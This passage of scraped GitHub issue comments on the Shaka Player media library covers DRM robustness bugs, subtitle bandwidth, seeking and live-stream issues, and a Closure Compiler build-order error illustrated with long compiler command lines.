\"{\"audioCapabilities\":[{\"contentType\":\"audio/mp4; codecs=\\\"mp4a.40.5\\\"\",\"robustness\":\"SW_SECURE_CRYPTO\"},{\"contentType\":\"audio/mp4; codecs=\\\"mp4a.40.2\\\"\",\"robustness\":\"SW_SECURE_CRYPTO\"},{\"contentType\":\"audio/webm; codecs=\\\"vorbis\\\"\",\"robustness\":\"SW_SECURE_CRYPTO\"}],\"distinctiveIdentifier\":\"not-allowed\",\"initDataTypes\":[\"cenc\",\"webm\"],\"label\":\"foo\",\"persistentState\":\"not-allowed\",\"sessionTypes\":[\"temporary\"],\"videoCapabilities\":[{\"contentType\":\"video/webm; codecs=\\\"vp9\\\"\",\"robustness\":\"SW_SECURE_CRYPTO\"},{\"contentType\":\"video/mp4; codecs=\\\"avc1.640028\\\"\",\"robustness\":\"SW_SECURE_CRYPTO\"},{\"contentType\":\"video/mp4; codecs=\\\"avc1.4d401e\\\"\",\"robustness\":\"SW_SECURE_CRYPTO\"}]}\"\nFirefox: stucked at promise pending. @cpearce Can you check my test inside last comment? It seems there is another bug inside Firefox, where it is stucked at promise pending when I query supported DRM robustness.. Hi guys, it looks very promising! I am looking forward to see this logic committed.. ",
    "karlovich": "@joeyparrish sorry I was on vacations. Seems that problem was on Content provider side. After some changes on configuration of CENC encrypted MPEG-DASH VOD streams shaka 2.0.0-beta2 was able to stream without this error. Thanks for your response, please close the issue.\n. @cpearce Thanks for the help,\nplease find answers at bugzilla.\n. Hi gents,\nThe same situation in our application, but our fragment is 2 sec and subs chunk size is about 32kb (TTML base64 images). Ability to download subs by user selection could save much CDN traffic and improve network performance and playback quality as a result.\n@vaage @joeyparrish, any updates on this?. @joeyparrish \n\nYour TTML contains base64-encoded images instead of actual text?\n\nYes\n\nyou have 2s segments, and each 2s of subs is 32kB?\n\nDepends on content inside. 32kB is max size but many chunks have two images inside.\n\nThat would be about 128 kbit/sec, which is as much bandwidth as some audio streams.\n\nSeems yes, one more audio stream in background.\nPlease see possible variations:\n30.4 \u043a\u0412 (two images inside) TTML-base64-m4s-Two-Images-Inside.txt\n16.2 \u043a\u0412 (one image inside) TTML-base64-m4s-One-Image-Inside.txt\n0.68 kB (empty) TTML-base-64-m4s-Empty.txt\n. @joeyparrish  Great thanks for the answer!. ",
    "esteban-dosztal": "If we trust caniuse.com, it seems that all major browsers but Opera Mini support it. http://caniuse.com/#feat=bloburls\nThanks!\n. This Pull Request was made with a commit with a wrong user email. Will fix it asap.\n. Sorry, forgot that step. Thanks!\n. Hi,\nDo you have any idea about if this PR will be merged into the 1.x version?\nThanks!\n. Thanks! I'm closing this PR and continue this thing in this one https://github.com/google/shaka-player/pull/522. Made the mistake of creating a PR from master branch, sorry, my fault.\n. Sorry for that.\nIt's updated.\nThanks!\n. ",
    "baljitweb": "still not clear....\n. thank you \n. ",
    "johnBartos": "@joeyparrish What versions does this affect?\n. Great, thanks!\n. @tdrews Is this strictly a Shaka 2 feature? Looking at the configure method in 1.6.5 there isn't any accommodation made for the abr property. \n```\nshaka.player.Player.prototype.configure = function(config) {\n  if (!config) return;\n// Alias.\n  var MapUtils = shaka.util.MapUtils;\nvar enableAdaptation = MapUtils.getBoolean(config, 'enableAdaptation');\n  if (enableAdaptation != null) {\n    this.videoSourceConfig_['enableAdaptation'] = enableAdaptation;\n  }\nvar streamBufferSize = MapUtils.getNumber(config, 'streamBufferSize', 0);\n  if (streamBufferSize != null) {\n    this.videoSourceConfig_['streamBufferSize'] = streamBufferSize;\n  }\nvar liveStreamEndedTimeout =\n      MapUtils.getNumber(config, 'liveStreamEndTimeout', 0);\n  if (liveStreamEndedTimeout != null) {\n    this.videoSourceConfig_['liveStreamEndTimeout'] = liveStreamEndedTimeout;\n  }\nvar licenseRequestTimeout =\n      MapUtils.getNumber(config, 'licenseRequestTimeout', 0);\n  if (licenseRequestTimeout != null) {\n    this.videoSourceConfig_['licenseRequestTimeout'] = licenseRequestTimeout;\n  }\nvar mpdRequestTimeout = MapUtils.getNumber(config, 'mpdRequestTimeout', 0);\n  if (mpdRequestTimeout != null) {\n    this.videoSourceConfig_['mpdRequestTimeout'] = mpdRequestTimeout;\n  }\nvar segmentRequestTimeout =\n      MapUtils.getNumber(config, 'segmentRequestTimeout', 0);\n  if (segmentRequestTimeout != null) {\n    this.videoSourceConfig_['segmentRequestTimeout'] = segmentRequestTimeout;\n  }\nvar preferredLanguage = MapUtils.getString(config, 'preferredLanguage');\n  if (preferredLanguage != null) {\n    this.videoSourceConfig_['preferredLanguage'] = preferredLanguage;\n  }\nvar restrictions = MapUtils.getAsInstanceType(\n      config, 'restrictions', shaka.player.Restrictions);\n  if (restrictions != null) {\n    this.videoSourceConfig_['restrictions'] = restrictions.clone();\n  }\nvar disableCacheBusting = MapUtils.getBoolean(config,\n      'disableCacheBustingEvenThoughItMayAffectBandwidthEstimation');\n  if (disableCacheBusting != null) {\n    shaka.util.AjaxRequest.enableCacheBusting = !disableCacheBusting;\n  }\nif (this.videoSource_) {\n    this.videoSource_.configure(this.videoSourceConfig_);\n  }\n};\n```\n. Found how to inject the custom abr manager here. Closing this out\n. @TheModMaker This still seems to be the case (in IE/Edge). Has there been a resolution on start gap seeking?. @joeyparrish Thanks for the quick reply. Yeah we can still reproduce on the latest version (2.3.2), in JW and the demo. Test stream: https://s3.amazonaws.com/bob.jwplayer.com/~alex/107415/dash/dash2.mpd\nIE/Edge will buffer this stream at time ~1.5s, keeping the tag in readyState 1. Chrome/FF will buffer at 0 (thus avoiding the issue altogether). So this may still exist there too (unless you're massaging the buffered start internally).\nWe have a workaround in JW where we'll seek to buffered.start(0) on the first progress event if we're not already at buffered.start(0). With safety checks it seems to work fine (e.g. ensuring were in readyState 1) but there's probably a few edge cases we're missing. . @TheModMaker Done https://github.com/google/shaka-player/issues/1281. @TheModMaker IIRC It was at ~1.56. @joeyparrish Thanks for the in-depth analysis and fix \ud83d\udc4d . ",
    "janouskovec": "Would it be possible to backport this optimization to version 1.6.x? We are using v1.6.4 and we have same performance issue with large timeshift depth.\n. In fact no need creating PR for me, because I already fixed the issue in my local repository and push now to my fork: janouskovec@Deferring filling URI templates.\n. Thank you for your support! I reported the bug to vendor of packager.\n. Hi Joey,\nThank you for response.\n\nBefore we can help you, we need to be able to reproduce the issue. I can't access the manifest URI above. Can you make this stream available to me somehow?\n\nYes, of course. Please use URL http://88.103.240.102:80/cdn/uri/get/?contentType=live&expiry=1486686587&id=402&playerType=dash&quality=web&region=1&skipIpAddressCheck=true&userId=100&token=660b063d8b42b75a75b03c17bb9db35c48695710\n\nCan you reproduce the issue with our latest release version?\n\nYes, I reproduced the issue in v2.0.3.\n\nCan you reproduce the issue with the latest code from master?\n\nNot tested in latest code from master.\n\nAre you using the demo app or your own custom app?\n\nWe are using own custom app based on Shaka v2.0.0, but same issue occurs in demo app based on v2.0.3. In demo app based on v2.0.2 issue occurs too.\n\nIf custom app, can you reproduce the issue using our demo app?\n\nYes.\n\nWhat browser and OS are you using?\n\nWin10+Chrome, OS X+Chrome.\n\nWhat did you do?\n\nI played live channel.\n\nWhat content did you load?\n\nLive content- custom asset.\n\nIf standard demo asset, which one?\n\nN/A\n\nIf custom asset, what manifest and license server URIs?\n\nPlease see URL http://88.103.240.102:80/cdn/uri/get/?contentType=live&expiry=1486686587&id=402&playerType=dash&quality=web&region=1&skipIpAddressCheck=true&userId=100&token=660b063d8b42b75a75b03c17bb9db35c48695710. The content isn't encrypted, so I didn't use any license URL.\n\nHow did you interact with the content, if at all?\n\nN/A. When I set log level V2, I see following messages in console:\nEdited, see: http://pastebin.com/C6Xb1YDP. > Is the playhead moving backward (probably slowly) as the video plays? Are you pausing it as it plays? \nWhen problem occurs I see freeze frame suddenly. I don't know if playhead is moving backward.\n\nIs this any better with the cache enabled or on a faster internet connection?\n\nWe already tested on different connections, but the connection speed has no effect on it. This problem occurs even if the connection speed is 100 Mbps.\nPlease see HAR file.  Last successfully downloaded segment at \"startedDateTime\": \"2017-01-17T12:04:31.579Z\". After this time the Shaka sending MPD requests only.. Today we tested some other browsers.\nWe are able to reproduce the problem on these browsers:\nChrome on Win10, FF on Win10, IE11 on Win10, Chrome on OS X, FF on Linux.. I sent URL to shaka-player-issues@google.com.. > if the \"real\" start date is not now - timeShiftBufferDepth, then it sounds like your timeShiftBufferDepth parameter is incorrect. If 1 day's worth of content is not actually available on your server, then you need to correct your manifest.\nI think, that MPD is correct. MPD contains SegementTime and S@t atribute, so \"real\" start date and  availability of segments should be derived from the attribute S@t.\n. ",
    "OrenMe": "Asked a developer at WWDC. Doesn't seem like it's in the top of their priorities.\nTold me to file an enhancement request radar J.\n. Thanks @joeyparrish, my main concern was that the parser was failing and stopping playback more then actually the support of this attributes in the browser.\nAs there are vtt files containing these attributes this fix will now enable playback with them.\n. Thanks @TheModMaker! will you be tagging v2.0.4 version any time soon?. Great, thanks @joeyparrish.. @TheModMaker here's a new license for the media: https://udrm.kaltura.com/cenc/widevine/license?custom_data=eyJjYV9zeXN0ZW0iOiJPVlAiLCJ1c2VyX3Rva2VuIjoiZGpKOE1UZ3dORE16TVh4NmdVUHVLS0pVWEpGZk9TNzAxNnRJRVprNDhLU0g3dVJzQkVROWVVS1RRTzIxU3lidDNrc0RxTFRBNG1OR3JQcG1faFFtbDFYblZMWjhvRF9qMjEySGVCSm1Wa1ZLQ1FBSDFvdXNWN3paRWc9PSIsImFjY291bnRfaWQiOiIxODA0MzMxIiwiY29udGVudF9pZCI6IjFfMWg0bTBiNjYiLCJmaWxlcyI6IjFfamJiOGpsOWwsMV8wOG0zOWhreSwxX21yamdpMmxyLDFfYm55eWh1anIifQ%3D%3D&signature=Y%2BOpyr6Jj1tRwr9mquqWf70GzZk%3D&. @TheModMaker here's a new license for the media: https://udrm.kaltura.com/cenc/widevine/license?custom_data=eyJjYV9zeXN0ZW0iOiJPVlAiLCJ1c2VyX3Rva2VuIjoiZGpKOE1UZ3dORE16TVh4NmdVUHVLS0pVWEpGZk9TNzAxNnRJRVprNDhLU0g3dVJzQkVROWVVS1RRTzIxU3lidDNrc0RxTFRBNG1OR3JQcG1faFFtbDFYblZMWjhvRF9qMjEySGVCSm1Wa1ZLQ1FBSDFvdXNWN3paRWc9PSIsImFjY291bnRfaWQiOiIxODA0MzMxIiwiY29udGVudF9pZCI6IjFfMWg0bTBiNjYiLCJmaWxlcyI6IjFfamJiOGpsOWwsMV8wOG0zOWhreSwxX21yamdpMmxyLDFfYm55eWh1anIifQ%3D%3D&signature=Y%2BOpyr6Jj1tRwr9mquqWf70GzZk%3D&. Hi @ismena, yes.\n. Thanks @ismena, would definitely check it out and see if I can contribute back.. @TheModMaker any news on this? do you need more info?. Thanks @joeyparrish and @TheModMaker. Hi @joeyparrish, thanks for the example, totally clear.\nWould you happen to know regarding the spec itself, is it like HLS where first chunklist in a playlist is the one selected for initial bitrate?\nFor example, in this case although the first chunklist bitrate is not the lowest an HLS player implementation would start at it and not at lowest one(which is the second)\n```\nEXTM3U\nEXT-X-STREAM-INF:PROGRAM-ID=1,BANDWIDTH=649879,CODECS=\"mp4a.40.2, avc1.4d401e\"\ngear2/prog_index.m3u8\nEXT-X-STREAM-INF:PROGRAM-ID=1,BANDWIDTH=232370,CODECS=\"mp4a.40.2, avc1.4d4015\"\ngear1/prog_index.m3u8\nEXT-X-STREAM-INF:PROGRAM-ID=1,BANDWIDTH=991714,CODECS=\"mp4a.40.2, avc1.4d401e\"\ngear3/prog_index.m3u8\nEXT-X-STREAM-INF:PROGRAM-ID=1,BANDWIDTH=1927833,CODECS=\"mp4a.40.2, avc1.4d401f\"\ngear4/prog_index.m3u8\n```\n. Thanks!. @joeyparrish can I send it to you privately? the other demo assets are playing fine.\nAlso, the asset I'm testing is working on other players, such as dashjs, so I guess it is something with this stream characteristic and how Shaka is expecting it to be.. @joeyparrish sent more details over mail. Thanks.. Hi @joeyparrish - did you get a chance to test this? thanks.. thanks @TheModMaker! I'll check it out.. @joeyparrish still waiting for vendor to apply change, I'll update. Thanks.. Hi @joeyparrish - it seems that your advice solved the issue on Chrome and Firefox, but on IE11(win10, haven't tested win 8.1 yet) the stream doesn't work.\nIt seems that there's a bigint precision error that coerce the LSB and therefore we see requests to segments which doesn't exist on the server.\nI sent you an updated stream URL in the email.\nAs this is another issue, let me know if you would like me to open a new one.\nThanks.\n. Yes, this fix has been introduced by our team, and if it's acceptable then it solves this issue completely. Thanks.. Thanks @forbesjo.\nIs there a scheduled release date for a fix?. thanks @TheModMaker . Hi @joeyparrish, do you know when 2.2.2 will be tagged? seems like nothing has been added to 2.2.x branch since this fix so hoping you can tag a patch version.\nThanks.. Thanks @joeyparrish . Hi @joeyparrish, I'm not sure I follow how this is related to the issue?. Hi @vaage did you happen to get some more info on the issue?. Thanks @vaage. @joeyparrish this means that seek won't be accurate? if we take this to UX - if I implement a scrubber and user scrubs near the end the scrubber will jump to the that fixed distance you are setting?. Apparently it is due to a \"Experimental Web Platform features\" flag I opened in chrome://flags so we can turn the alarm off for now.\nThis is probably a bug with Chrome so I will report it in Chromium, but this might be an indication that a crash is about to happen when this feature will get its flag removed. . Thanks @hbengali - I was in transit till today and wanted to debug to get more info before opening the bug.\nDo you happen to know why I can't access the chromium bug?. Hi @TheModMaker, were you able to observe the issue with the test page I sent?. @joeyparrish thank you so much!!! is there any external reference I can get to the internal reference ID?. @vaage yes, I just played it on dash.js nightly and on bitmovin test page(you will need to enable mix content as the stream is http and page is https). Hi @vaage thanks for the update, let me know if you require additional info.. Hi @vaage @joeyparrish please see this issue in ExoPlayer: https://github.com/google/ExoPlayer/issues/3457\nIt relates to this same stream.\nParticularly this: https://github.com/google/ExoPlayer/issues/3457#issuecomment-344727212 and this: https://github.com/google/ExoPlayer/issues/3457#issuecomment-344873473 . Hi @vaage any update on this? thanks.. Starting with not having to associate a player with storage would be good.\nWhy wouldn\u2019t you be able to call loadInternal? Because of the getMetworkingEngine call? Cause that\u2019s exactly what I was wondering about in the original question - is it mandatory to get networking engine from the player instance? I don\u2019t see any reason to not use the network engine directly. Maybe it is just not exposed as public in the lib?. So in general the only issue I see is the coupling to the getConfiguration call on the player.\nThe entire configuration method and logic can be exported to it's own module and then can be used with both player and storage.\nMaybe not even that far - the config used is pretty limited, I think it's DRM and network config, so this can just be set via the storage config itself.\nWDYT?. I mentioned the use case above.\nFrom my experience with clients they require to download without a playback\nuse case.\nThink of this in terms of Netflix experinave.\nYou open the app and see the gallery of movie titles, no playback is\nrequired.\nUser than starts downloading straight from that screen.\nThis is the more popular use case and for this a player is not required\nyet, or at all.\nOnce background fetch is implemented not requiring a player would be even\nmore common.\nSo the share logic might not be relevant in this case.\nWDYT?\nOn Tue, 20 Feb 2018 at 19:38 Jacob Trimble notifications@github.com wrote:\n\nThe reason we use a Player instance in Storage is to share the\nconfiguration and networking engine. We wanted to avoid requiring the app\nto configure both the Player and the Storage with their retry parameters,\nrestrictions, and request filters. We could have Storage use its own\nnetworking engine, but the app will need to register its request/response\nfilters with Storage in addition to the Player. But we could add a\nconvenience method to copy the settings from the given Player so the app\ndoesn't need to copy everything.\nAs for the configuration, maybe we should move the Storage-specific\nsettings into a sub-section. Like streaming, we could have a storage\ngroup. Then the Storage.configure method would accept the same thing as\nPlayer. The downside is that it will be complicated to implement with\nreverse-compatibility.\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly, view it on GitHub\nhttps://github.com/google/shaka-player/issues/1297#issuecomment-367056711,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/AFNXZpbP6mmVtmcHoH5P-TuhNbxLeUVnks5tWwL7gaJpZM4SCnww\n.\n. Pause/resume of a download without closing the tab is indeed easy - already have a working POC with a checkPaused promise before calling download segment.\nI think this is very narrow use case as clients would like a more rich experience.\nCan you elaborate on the DB issues? Is this the only limitation as you currently see it? As I think it would be indeed mandatory to signal the download state between tabs via the DB with a manifest download state flag or some kind of signal.. \n",
    "AhsanEjazC": "One question though, how does dashjs play on ios?. @joeyparrish Yeah, I got it working on iOS with HLS. Live streaming was working too. @joeyparrish BTW, can shaka player play HLS on iOS?. ",
    "mayeaux": "Do we have any idea when Apple plans to support MSE API? . ",
    "liwaiwai": "The cause of why Shaka Player v2.0.0-beta2-debug cannot do the playback is identified. It's due to https://github.com/google/shaka-player/issues/366\nThe trunk with the fix can play the reported contents\n. ",
    "mohitYogi": "@joeyparrish  yes, for sure.\nHere they are:\nfiles.zip\n. the code is also not working on IE 11. So, till tested only FireFox runs it properly.\n. @joeyparrish, I have tried that earlier and tried it now but still not working.\nIt doesn't show any error, the player displays total time of video, but still doesn't plays the video.\nIt doesn't even plays the audio which is unencrypted.\nHelp me with this, it can be a silly mistake but still can't figure it out.\n. @joeyparrish I have used Mp4Box to encrypt and encode this content.\n. @joeyparrish   Logs and fixed version of html file.\nshaka-error.zip\n. @joeyparrish I can understand that there is a problem in encoding the content then how FireFox is able to play it?\nand apart from that, can you tell me what other tools I can use to encode the content??? your suggetions will be helpful..\n. ",
    "hochhaus": "@joeyparrish Thanks. I updated the CONTRIBUTORS and AUTHORS files. Please let me know if I missed anything else.\nPTAL\n. > Were these caught by the new compiler in #421?\nYes\n. Thanks for the very prompt review!\nPTAL\n. @joeyparrish Could you please take another look at this updated change?\n. @joeyparrish Thanks for your feedback. I broke up this change into pull reuests per your recommendation hoping to make them a bit easier to merge.\nThis change depends upon #453, #454, #455, #456, #457, #458, #459. However all of the other changes should be independent of one another and can be reviewed/merged in any order.\nPTAL\n. Updated to include the {width,height} string to number conversion.\nPTAL\n. Rebased.\nPTAL\n. Strange, this did not happen locally for me. Looking more.\n. Hmmm, I'm having no luck reproducing this. Do you have any hints for what might be different on the shaka-player-bot machine?\n. I still have been unable to reproduce any failures. I tried 32 and 64 bit linux kernels with openjdk 7, 8 and 9.\nCan you share which jdk you are seeing the failures on?\nSomething strange is going on because my linux desktop (as well as a digital ocean droplet I just spun up) compile without errors. The shaka-player-bot host compiles with one error and your machine compiles with two errors.\n. After getting much debugging help from @dbhoot I think the source of this issue might be that the build scripts use os.walk() to determine the order in which input files are passed to the compiler. As the order of files returned from os.walk() is dependent on the directory entries in the file system this leads to unpredictable results across machines.\nI'll look into turning on --dependency_mode in another change in order to have the compiler pre-sort the files.\nFor example, this ordering of files results in an error:\njava -jar third_party/closure/compiler.jar \\\n--language_in ECMASCRIPT5 \\\n--language_out ECMASCRIPT3 \\\n--jscomp_error=* \\\n--jscomp_off=deprecatedAnnotations \\\n--extra_annotation_name=listens \\\n--extra_annotation_name=exportDoc \\\n--conformance_configs build/conformance.textproto \\\n-O ADVANCED \\\n--generate_exports \\\n--output_wrapper_file=build/wrapper.template.js \\\n-D COMPILED=true \\\n-D goog.DEBUG=false \\\n-D goog.STRICT_MODE_COMPATIBLE=true \\\n-D goog.ENABLE_DEBUG_LOADER=false \\\n-D goog.asserts.ENABLE_ASSERTS=false \\\n-D shaka.log.MAX_LOG_LEVEL=0 \\\n-D 'GIT_VERSION=\"v2.0.0-beta2-138-ge7c29c0\"' \\\n--jscomp_off=missingRequire \\\n--jscomp_off=strictMissingRequire \\\n--checks-only \\\n-O SIMPLE \\\ntest/test/util/fake_media_source_engine.js \\\nthird_party/closure/goog/base.js \\\nlib/dash/segment_base.js \\\nlib/polyfill/patchedmediakeys_ms.js \\\ndemo/assets.js \\\nlib/util/array_utils.js \\\ntest/media/playhead_unit.js \\\nlib/offline/db_engine.js \\\nlib/dash/segment_template.js \\\nlib/media/ttml_text_parser.js \\\ntest/media/streaming_engine_integration.js \\\ntest/test/util/simple_fakes.js \\\ntest/media/drm_engine_integration.js \\\nlib/net/data_uri_plugin.js \\\ntest/media/media_source_engine_integration.js \\\nlib/util/text_parser.js \\\nexterns/shaka/manifest.js \\\nexterns/shaka/net.js \\\nexterns/jwk_set.js \\\nexterns/shaka/offline.js \\\nthird_party/closure/goog/uri/uri.js \\\nthird_party/closure/goog/uri/utils.js \\\nlib/cast/cast_receiver.js \\\nexterns/prefixed_eme.js \\\ndemo/receiver_app.js \\\nexterns/shaka/manifest_parser.js \\\nlib/media/manifest_parser.js \\\ntest/cast/cast_utils_unit.js \\\nlib/util/xml_utils.js \\\nlib/util/language_utils.js \\\nlib/debug/log.js \\\ntest/dash/dash_parser_segment_base_unit.js \\\nlib/dash/content_protection.js \\\ntest/util/cancelable_chain_unit.js \\\ntest/test/util/dash_parser_util.js \\\nexterns/shaka/player.js \\\nlib/util/fake_event.js \\\nlib/cast/cast_proxy.js \\\nlib/abr/simple_abr_manager.js \\\nlib/util/uint8array_utils.js \\\nlib/media/playhead.js \\\ntest/offline/db_engine_unit.js \\\nlib/debug/asserts.js \\\ntest/media/drm_engine_unit.js \\\ntest/media/text_engine_unit.js \\\nlib/dash/mpd_utils.js \\\nlib/media/presentation_timeline.js \\\ntest/dash/dash_parser_content_protection_unit.js \\\ntest/media/mp4_segment_index_parser_unit.js \\\nlib/media/streaming_engine.js \\\nlib/util/config_utils.js \\\ntest/media/mp4_vtt_parser_unit.js \\\ntest/test/util/util.js \\\ntest/test/util/streaming_engine_util.js \\\ntest/test/externs/jasmine.js \\\nexterns/shaka/abr_manager.js \\\ntest/util/data_view_reader_unit.js \\\nlib/polyfill/promise.js \\\ntest/cast/cast_sender_unit.js \\\ntest/media/streaming_engine_unit.js \\\ntest/dash/dash_parser_live_unit.js \\\nlib/util/timer.js \\\nlib/dash/segment_list.js \\\ntest/offline/storage_unit.js \\\nlib/util/ebml_parser.js \\\ntest/offline/offline_integration.js \\\ntest/test/externs/karma.js \\\nlib/offline/download_manager.js \\\ntest/util/ebml_parser_unit.js \\\nexterns/fullscreen.js \\\ntest/dash/mpd_utils_unit.js \\\nlib/util/multi_map.js \\\ntest/net/networking_engine_unit.js \\\ntest/test/externs/sprintf.js \\\ntest/media/media_source_engine_unit.js \\\nlib/util/i_destroyable.js \\\nlib/polyfill/videoplaybackquality.js \\\ndemo/controls.js \\\nlib/media/webm_segment_index_parser.js \\\ntest/test/util/manifest_generator.js \\\ndemo/info_section.js \\\ntest/cast/cast_proxy_unit.js \\\ntest/dash/dash_parser_segment_list_unit.js \\\ntest/dash/dash_parser_manifest_unit.js \\\nlib/abr/ewma.js \\\ntest/util/event_manager_unit.js \\\nlib/net/networking_engine.js \\\nlib/media/drm_engine.js \\\nlib/cast/cast_utils.js \\\nlib/util/fake_event_target.js \\\ntest/util/string_utils_unit.js \\\nlib/player.js \\\ntest/test/util/test_scheme.js \\\ndemo/offline_section.js \\\nexterns/xmlhttprequest.js \\\nlib/polyfill/fullscreen.js \\\ndemo/main.js \\\ntest/player_unit.js \\\nlib/offline/offline_utils.js \\\nlib/util/data_view_reader.js \\\nexterns/chromecast.js \\\nlib/media/media_source_engine.js \\\ntest/test/util/fake_networking_engine.js \\\ntest/media/segment_index_unit.js \\\ntest/util/text_parser_unit.js \\\nlib/util/string_utils.js \\\nexterns/shaka/namespace.js \\\ndemo/asset_section.js \\\nlib/util/public_promise.js \\\nlib/media/vtt_text_parser.js \\\nlib/media/time_ranges_utils.js \\\ntest/media/mp4_ttml_parser_unit.js \\\ntest/net/http_plugin_unit.js \\\ntest/util/pssh_unit.js \\\nlib/dash/dash_parser.js \\\nlib/polyfill/all.js \\\ndemo/log_section.js \\\ntest/player_integration.js \\\ntest/test/util/memory_db_engine.js \\\nexterns/msmediakeys.js \\\nlib/polyfill/mediakeys.js \\\ntest/media/ttml_text_parser_unit.js \\\nlib/offline/storage.js \\\ntest/abr/simple_abr_manager_unit.js \\\ntest/media/presentation_timeline_unit.js \\\nexterns/mediakeys.js \\\nlib/util/functional.js \\\nlib/offline/offline_scheme.js \\\ntest/util/fake_event_target_unit.js \\\ntest/test/util/stream_generator.js \\\nlib/media/text_engine.js \\\nlib/media/segment_reference.js \\\nlib/util/pssh.js \\\nlib/debug/timer.js \\\nlib/polyfill/patchedmediakeys_webkit.js \\\ntest/dash/dash_parser_segment_template_unit.js \\\nlib/media/segment_index.js \\\ntest/test/externs/require.js \\\nlib/media/mp4_vtt_parser.js \\\nlib/util/event_manager.js \\\ntest/util/xml_utils_unit.js \\\ntest/cast/cast_receiver_unit.js \\\nlib/polyfill/patchedmediakeys_nop.js \\\ndemo/load.js \\\ndemo/demo_utils.js \\\nlib/media/mp4_segment_index_parser.js \\\nlib/util/map_utils.js \\\ntest/net/data_uri_plugin_unit.js \\\ntest/media/vtt_text_parser_unit.js \\\nlib/media/mp4_ttml_parser.js \\\nlib/net/http_plugin.js \\\nlib/util/mp4_parser.js \\\nlib/abr/ewma_bandwidth_estimator.js \\\nlib/util/cancelable_chain.js \\\ndemo/configuration_section.js \\\nlib/cast/cast_sender.js \\\nlib/util/error.js \\\nlib/offline/offline_manifest_parser.js \\\nlib/util/stream_utils.js;\nThe error is:\n```\ntest/test/util/fake_media_source_engine.js:149: ERROR - mismatch of the bufferedAheadOf property type and the type of the property it overrides from superclass shaka.media.MediaSourceEngine\noriginal: function (this:shaka.media.MediaSourceEngine, string, number, number=): number\noverride: function (this:shaka.test.FakeMediaSourceEngine, ?, ?, ?): ?\nshaka.test.FakeMediaSourceEngine.prototype.bufferedAheadOf = function(\n^\n1 error(s), 0 warning(s), 90.5% typed\n```\nHowever, this ordering of files results in no error:\njava -jar third_party/closure/compiler.jar \\\n--language_in ECMASCRIPT5 \\\n--language_out ECMASCRIPT3 \\\n--jscomp_error=* \\\n--jscomp_off=deprecatedAnnotations \\\n--extra_annotation_name=listens \\\n--extra_annotation_name=exportDoc \\\n--conformance_configs build/conformance.textproto \\\n-O ADVANCED \\\n--generate_exports \\\n--output_wrapper_file=build/wrapper.template.js \\\n-D COMPILED=true \\\n-D goog.DEBUG=false \\\n-D goog.STRICT_MODE_COMPATIBLE=true \\\n-D goog.ENABLE_DEBUG_LOADER=false \\\n-D goog.asserts.ENABLE_ASSERTS=false \\\n-D shaka.log.MAX_LOG_LEVEL=0 \\\n-D 'GIT_VERSION=\"v2.0.0-beta2-138-ge7c29c0\"' \\\n--jscomp_off=missingRequire \\\n--jscomp_off=strictMissingRequire \\\n--checks-only \\\n-O SIMPLE \\\nlib/util/fake_event_target.js \\\ntest/offline/db_engine_unit.js \\\ntest/test/util/simple_fakes.js \\\ntest/net/data_uri_plugin_unit.js \\\nexterns/msmediakeys.js \\\ndemo/main.js \\\nexterns/prefixed_eme.js \\\nlib/polyfill/patchedmediakeys_webkit.js \\\nlib/util/stream_utils.js \\\ndemo/receiver_app.js \\\ntest/net/networking_engine_unit.js \\\nlib/dash/segment_template.js \\\ndemo/demo_utils.js \\\nlib/offline/download_manager.js \\\ntest/cast/cast_receiver_unit.js \\\ntest/dash/dash_parser_segment_list_unit.js \\\nlib/polyfill/fullscreen.js \\\ntest/offline/offline_integration.js \\\nlib/offline/offline_manifest_parser.js \\\ntest/media/ttml_text_parser_unit.js \\\nlib/debug/timer.js \\\nexterns/xmlhttprequest.js \\\ntest/test/util/fake_media_source_engine.js \\\nthird_party/closure/goog/base.js \\\nlib/media/segment_reference.js \\\nlib/polyfill/patchedmediakeys_ms.js \\\nlib/net/data_uri_plugin.js \\\nlib/offline/offline_scheme.js \\\nlib/offline/offline_utils.js \\\nexterns/mediakeys.js \\\nexterns/shaka/net.js \\\ndemo/assets.js \\\nlib/media/manifest_parser.js \\\ntest/media/drm_engine_unit.js \\\ntest/media/streaming_engine_integration.js \\\nlib/cast/cast_receiver.js \\\nlib/polyfill/promise.js \\\ntest/util/ebml_parser_unit.js \\\nlib/media/mp4_ttml_parser.js \\\ntest/abr/simple_abr_manager_unit.js \\\ntest/test/util/fake_networking_engine.js \\\ntest/util/xml_utils_unit.js \\\ntest/media/streaming_engine_unit.js \\\nlib/util/map_utils.js \\\nlib/polyfill/mediakeys.js \\\nlib/cast/cast_sender.js \\\ntest/test/util/manifest_generator.js \\\ntest/test/externs/karma.js \\\nlib/util/array_utils.js \\\ntest/test/util/dash_parser_util.js \\\ntest/player_unit.js \\\ntest/dash/dash_parser_live_unit.js \\\ntest/util/string_utils_unit.js \\\nlib/abr/simple_abr_manager.js \\\nlib/debug/log.js \\\nlib/net/http_plugin.js \\\ntest/media/mp4_vtt_parser_unit.js \\\ntest/media/media_source_engine_integration.js \\\ntest/test/util/util.js \\\nlib/util/mp4_parser.js \\\nlib/cast/cast_utils.js \\\nlib/util/pssh.js \\\nlib/media/mp4_vtt_parser.js \\\ntest/dash/dash_parser_segment_base_unit.js \\\nlib/dash/content_protection.js \\\nlib/util/xml_utils.js \\\ntest/test/util/streaming_engine_util.js \\\ntest/media/media_source_engine_unit.js \\\ntest/media/presentation_timeline_unit.js \\\nlib/util/public_promise.js \\\ntest/dash/mpd_utils_unit.js \\\nthird_party/closure/goog/uri/utils.js \\\ndemo/asset_section.js \\\nexterns/fullscreen.js \\\nlib/util/string_utils.js \\\nlib/abr/ewma.js \\\ntest/media/text_engine_unit.js \\\nlib/util/ebml_parser.js \\\ndemo/configuration_section.js \\\ntest/dash/dash_parser_segment_template_unit.js \\\nlib/util/fake_event.js \\\nlib/media/time_ranges_utils.js \\\ndemo/load.js \\\nlib/util/cancelable_chain.js \\\nlib/dash/segment_list.js \\\nlib/media/drm_engine.js \\\ntest/test/externs/jasmine.js \\\nlib/util/error.js \\\nlib/util/timer.js \\\ntest/util/fake_event_target_unit.js \\\nlib/polyfill/patchedmediakeys_nop.js \\\nlib/util/language_utils.js \\\nlib/dash/mpd_utils.js \\\nlib/util/event_manager.js \\\ndemo/info_section.js \\\nlib/media/media_source_engine.js \\\nlib/media/vtt_text_parser.js \\\ndemo/log_section.js \\\ntest/net/http_plugin_unit.js \\\ntest/dash/dash_parser_content_protection_unit.js \\\nlib/util/uint8array_utils.js \\\ntest/offline/storage_unit.js \\\nlib/debug/asserts.js 